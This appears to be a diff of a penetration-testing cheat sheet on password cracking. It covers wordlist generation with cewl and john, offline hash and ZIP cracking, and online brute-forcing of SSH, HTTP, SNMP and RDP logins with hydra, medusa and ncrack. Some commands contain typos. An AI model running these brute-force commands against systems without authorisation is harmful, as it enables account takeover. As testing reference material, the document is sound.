@@ -1,6 +1,6 @@
 # Generate custom wordlist
 
-## Cewl - Spider and build dictionary
+## Cewl - Spider and build dictionary
 ```
 cewl -w createWordlist.txt https://www.example.com
 ```
@@ -10,7 +10,7 @@ cewl -w createWordlist.txt https://www.example.com
 cewl -w createWordlist.txt -m 6 https://www.example.com
 ```
 
-## Improve the custom wordlist
+## Improve the custom wordlist
 ```
 john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
 ```
@@ -21,7 +21,7 @@ john ---wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
 
 In kali we can use `hash-identifier` or `hashid`
 
-## Cracking the hash
+## Cracking the hash
 
 **OFFLINE**
 ```
@@ -35,15 +35,15 @@ john --wordlist=wordlist.txt dump.txt
 * [Hashkiller](https://hashkiller.co.uk/)
 * Google hashes Search pastebin.
 
-## ZIP
+## ZIP
 
 ```
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
 ```
 
-# Online password cracking
+# Online password cracking
 
-## Port 22 - SSH
+## Port 22 - SSH
 ```
 hydra -l root -P wordlist.txt 192.168.0.101 ssh
 ```
@@ -58,7 +58,7 @@ medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
 hydra -P wordlist.txt -v 102.168.0.101 snmp
 ```
 
-## Port 3389 - Remote Desktop Protocol
+## Port 3389 - Remote Desktop Protocol
 ```
 ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
 ```
